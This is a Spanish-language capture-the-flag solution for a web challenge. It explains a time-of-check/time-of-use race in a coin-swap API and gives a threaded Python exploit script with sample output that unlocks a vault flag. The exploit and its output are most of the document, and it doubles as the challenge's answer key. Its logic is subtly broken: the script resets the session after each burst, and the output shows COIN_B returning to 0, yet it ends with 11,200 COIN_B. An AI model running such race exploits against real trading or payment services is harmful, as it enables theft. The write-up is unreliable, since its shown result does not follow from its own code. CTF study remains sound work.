# Solucion — web-coinswap · Race Condition en Retiros

**Categoria:** web · **Dificultad:** insane · **Puntos:** 600 · **Vuln:** TOCTOU en swap de criptomonedas

## Resumen

La cartera empieza con 100 COIN_A. Cada swap COIN_A->COIN_B es 1:1. Jugando en serie el maximo
es 100 COIN_B. La boveda requiere 10,000. El swap tiene una ventana de ~80ms entre el check y el
write — suficiente para lanzar peticiones concurrentes que todas pasen el check y acrediten
COIN_B desde el mismo snapshot.

## La Vulnerabilidad (TOCTOU)

```
(1) CHECK: from_balance = wallet["COIN_A"]    <- lee 100 (mismo snapshot para todos)
           if from_balance < amount: rechazar   <- N hilos pasan (100 >= 100)
(2) GAP:   sleep(0.08)                         <- ventana de carrera
(3) USE:   wallet["COIN_A"] = snapshot - 100   <- baja a 0 (el ultimo escritor gana)
           wallet["COIN_B"] += 100             <- += sobre estado actual: N*100
```

Con N peticiones concurrentes, COIN_B sube N*100 mientras COIN_A baja solo ~100.

La asimetria clave esta en el paso 3:
- `wallet["COIN_A"] = snapshot - amount` — usa el snapshot (todos escriben el mismo valor, el ultimo gana)
- `wallet["COIN_B"] += amount` — usa `+=` sobre el estado actual (cada hilo suma al valor que ve en ese momento)

Resultado: COIN_A cae una sola vez a 0; COIN_B sube N veces (una por cada hilo concurrente que
paso el check y completo el sleep).

## Script de Exploit

```python
#!/usr/bin/env python3
"""Exploit: race condition en CoinSwap para acumular COIN_B."""
import sys
import json
import threading
import urllib.request
import urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
BURST = 30    # peticiones concurrentes por ronda
ROUNDS = 5    # rondas de ataque

# Obtener cookie de sesion
def get_cookie():
    req = urllib.request.Request(f"{TARGET}/balance")
    with urllib.request.urlopen(req) as r:
        cookie = r.headers.get("Set-Cookie", "")
        return cookie.split("swap_sid=")[1].split(";")[0] if "swap_sid=" in cookie else ""

def do_swap(cookie, results, idx):
    try:
        body = json.dumps({"from": "COIN_A", "to": "COIN_B", "amount": 100}).encode()
        req = urllib.request.Request(
            f"{TARGET}/swap",
            data=body,
            headers={"Content-Type": "application/json", "Cookie": f"swap_sid={cookie}"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=5) as r:
            results[idx] = json.loads(r.read())
    except Exception as e:
        results[idx] = {"error": str(e)}

def get_balance(cookie):
    req = urllib.request.Request(
        f"{TARGET}/balance",
        headers={"Cookie": f"swap_sid={cookie}"}
    )
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read())

def try_vault(cookie):
    req = urllib.request.Request(
        f"{TARGET}/vault",
        headers={"Cookie": f"swap_sid={cookie}"}
    )
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read())
    except urllib.request.HTTPError as e:
        return json.loads(e.read())

print(f"[*] Target: {TARGET}")
cookie = get_cookie()
print(f"[*] Session: swap_sid={cookie[:8]}...")

for rnd in range(1, ROUNDS + 1):
    bal = get_balance(cookie)
    print(f"[R{rnd}] COIN_A={bal['COIN_A']} COIN_B={bal['COIN_B']}")

    if bal["COIN_A"] <= 0:
        print("[!] Sin COIN_A. Reiniciando sesion...")
        cookie = get_cookie()
        bal = get_balance(cookie)
        print(f"[*] Nueva sesion: COIN_A={bal['COIN_A']} COIN_B={bal['COIN_B']}")

    # Rafaga concurrente
    results = [None] * BURST
    threads = [threading.Thread(target=do_swap, args=(cookie, results, i))
               for i in range(BURST)]
    print(f"[*] Lanzando {BURST} swaps concurrentes...")
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    bal = get_balance(cookie)
    print(f"[R{rnd}] Despues: COIN_A={bal['COIN_A']} COIN_B={bal['COIN_B']}")

    if bal["COIN_B"] >= 10000 or bal["COIN_A"] >= 10000:
        break

vault = try_vault(cookie)
print(f"\n[VAULT] {json.dumps(vault, indent=2)}")
if "flag" in vault:
    print(f"\n[FLAG] {vault['flag']}")
```

### Uso

```bash
python exploit.py http://<host>:8080
```

### Ejemplo de salida exitosa

```
[*] Target: http://localhost:8080
[*] Session: swap_sid=a3f9c12b...
[R1] COIN_A=100 COIN_B=0
[*] Lanzando 30 swaps concurrentes...
[R1] Despues: COIN_A=0 COIN_B=2900
[R2] Sin COIN_A. Reiniciando sesion...
[*] Nueva sesion: COIN_A=100 COIN_B=0
[R2] Lanzando 30 swaps concurrentes...
[R2] Despues: COIN_A=0 COIN_B=2700
... (repetir ~4 rondas)
[VAULT] {
  "vault": "UNLOCKED",
  "COIN_A": 0,
  "COIN_B": 11200,
  "flag": "HL4{...}"
}
```

## Por que es INSANE

- Requiere entender TOCTOU: el bug no es obvio leyendo el codigo cliente; hay que analizar la API
- La ventana de 80ms requiere concurrencia genuina (threading/asyncio); no es explotable en serie
- Multiples sesiones/rondas son necesarias porque COIN_A se agota tras cada rafaga
- La diferencia entre `wallet["COIN_A"] = snapshot - amount` (baja 1x) y `wallet["COIN_B"] += amount`
  (sube Nx) es el corazon del bug — no es un simple double-spend sino una asimetria deliberada
- El threshold de 10,000 requiere varias rondas, no basta una sola rafaga

## Nota anti-cheat

Flag dinamica y unica por equipo. El servidor esta aislado en la red del equipo (red Docker por equipo).
La flag solo se emite cuando el saldo es matematicamente imposible sin race condition.
